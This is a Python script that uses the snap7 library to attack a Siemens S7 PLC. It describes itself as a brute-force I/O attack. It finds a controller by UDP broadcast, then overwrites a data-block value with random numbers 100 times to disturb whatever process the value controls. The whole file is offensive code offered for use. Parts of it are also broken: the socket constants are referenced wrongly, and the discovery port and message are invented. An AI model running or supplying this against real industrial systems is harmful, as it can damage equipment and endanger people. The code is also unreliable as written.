import snap7
import time
import random
import socket
import struct

# Configuration - Adjust these based on your environment
PLC_IP = None # Initialize PLC_IP to None.  Will be determined dynamically.
RACK = 0
SLOT = 1
DB_NUMBER = 1  # Example: Data Block 1
START_ADDRESS = 0  # Start address within the DB
BYTE_LENGTH = 4   # Example:  Read/Write 4 bytes (a float)
IO_POINT_ADDRESS = 10 # address of I/O point to manipulate, relative to DB
SLEEP_TIME = 0.1 # Time to wait between I/O attempts (seconds)
NUM_ATTEMPTS = 100 # Number of brute force attempts to make


def find_plc_ip():
    """
    Attempts to discover the PLC's IP address by broadcasting on the network.
    This is a simplified approach and might not work in all network configurations.
    It relies on the PLC responding to a specific broadcast message.

    Returns:
        str: The IP address of the PLC if found, otherwise None.
    """

    broadcast_address = '<broadcast>'  # Standard broadcast address
    port = 5005  # Example port to listen on.  Adjust to match your PLC configuration.
    message = b"S7 Discovery"  # Example discovery message.  Adjust to match your PLC configuration.

    sock = socket.socket(socket.socket.AF_INET, socket.socket.SOCK_DGRAM)
    sock.setsockopt(socket.socket.SOL_SOCKET, socket.socket.SO_BROADCAST, 1)  # Enable broadcasting
    sock.bind(('', port)) #Listen on all interfaces

    try:
        print("Attempting to discover PLC IP address...")
        sock.sendto(message, (broadcast_address, port))

        sock.settimeout(5) # Set a timeout for receiving a response

        data, addr = sock.recvfrom(1024)
        print(f"Received {data!r} from {addr}")
        plc_ip = addr[0]
        print(f"PLC IP address found: {plc_ip}")
        return plc_ip

    except socket.timeout:
        print("No PLC response received within the timeout period.")
        return None
    except Exception as e:
        print(f"An error occurred during PLC discovery: {e}")
        return None
    finally:
        sock.close()




def float_to_bytes(f):
    """Converts a float to a byte array (4 bytes, IEEE 754 single precision)."""
    return struct.pack('>f', f)  # Big-endian float


def bytes_to_float(b):
    """Converts a byte array (4 bytes) to a float."""
    return struct.unpack('>f', b)[0]  # Big-endian float



def brute_force_io(plc_ip, rack, slot, db_number, start_address, byte_length, io_point_address, num_attempts, sleep_time):
    """
    Performs a brute-force I/O attack on a specified I/O point in a PLC.

    Args:
        plc_ip (str): The IP address of the PLC.
        rack (int): The PLC rack number.
        slot (int): The PLC slot number.
        db_number (int): The data block number.
        start_address (int): The starting address within the data block to read/write.
        byte_length (int): The number of bytes to read/write.
        io_point_address (int): The address of the target I/O point within the DB, relative to start_address.
        num_attempts (int): The number of brute-force attempts to perform.
        sleep_time (float): The time to sleep between attempts (in seconds).
    """

    try:
        plc = snap7.client.Client()
        plc.connect(plc_ip, rack, slot)
        print(f"Connected to PLC at {plc_ip}, Rack={rack}, Slot={slot}")


        for i in range(num_attempts):
            try:
                # 1. Read the current value of the target I/O point
                read_data = plc.db_read(db_number, start_address + io_point_address, byte_length)
                current_value = bytes_to_float(read_data)  # Assuming it's a float

                # 2. Generate a random new value
                #   Consider restricting the range of random values to something more realistic
                #   for the process being controlled.  Extreme values can cause unwanted side effects.
                new_value = random.uniform(current_value - 5, current_value + 5)  # Example: +/- 5 around current value

                # 3. Write the new value to the target I/O point
                write_data = float_to_bytes(new_value)
                plc.db_write(db_number, start_address + io_point_address, write_data)

                print(f"Attempt {i+1}:  Current Value: {current_value:.2f}, Writing: {new_value:.2f} to DB{db_number}.DB{start_address+io_point_address}")

                time.sleep(sleep_time)

            except Exception as e:
                print(f"Error during I/O attempt {i+1}: {e}")


    except Exception as e:
        print(f"Error connecting to PLC or during main loop: {e}")

    finally:
        if 'plc' in locals() and plc.get_connected():
            plc.disconnect()
            print("Disconnected from PLC.")




if __name__ == "__main__":

    # 1. Attempt to find the PLC IP address
    if PLC_IP is None:
        PLC_IP = find_plc_ip()

    if PLC_IP is None:
        print("Failed to determine PLC IP address.  Exiting.")
    else:
        # 2. Perform the brute-force attack
        brute_force_io(PLC_IP, RACK, SLOT, DB_NUMBER, START_ADDRESS, BYTE_LENGTH, IO_POINT_ADDRESS, NUM_ATTEMPTS, SLEEP_TIME)